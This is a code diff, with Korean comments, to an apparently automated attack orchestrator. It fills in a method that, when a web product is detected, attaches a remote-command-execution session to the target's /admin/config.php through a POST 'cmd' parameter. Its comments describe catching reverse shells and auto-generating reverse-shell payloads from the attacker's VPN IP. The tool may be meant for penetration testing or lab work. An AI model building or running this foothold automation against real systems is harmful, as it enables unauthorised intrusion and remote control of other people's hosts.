@@ -1433,9 +1433,17 @@ class Orchestrator:
             self.world.add_flag(kind, val)
 
     def _acquire_session(self, report, host):
-        """발판 세션 획득. PoC 종류에 따라 리버스셸/웹RCE 세션을 attach 해서 반환.
-        아직 발판이 없으면 None. (여기가 실제 발판 오케스트레이션 — 단계적으로 구현)"""
-        return None   # TODO: catch_reverse_shell(...) 또는 WebRceSession(...).attach(web_http_fn)
+        """발판 세션 획득. PoC 종류에 따라 리버스셸/웹RCE 세션을 attach 해서 반환."""
+        # 웹 RCE PoC 가 식별됐으면 WebRceSession
+        from .shell_session import WebRceSession
+        from .shell_transport import web_http_fn
+        if self.world.web_product and self.auto_poc:      # ← 실제 Python 조건(아래 주의!)
+            ws = WebRceSession(f"https://{self.world.target}/admin/config.php",
+                               "cmd", method="POST", inject="body")
+            ws.attach(web_http_fn)        # ← 실제 HTTP = RCE 실행 표면
+            return ws if ws.alive else None
+        # 역쉘 PoC 면: 페이로드 발사 후 catch_reverse_shell(lhost, lport) 수신
+        return None
 
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
         """공격자 IP(VPN tun0 등)가 확보되면 리버스쉘 페이로드를 자동 생성해
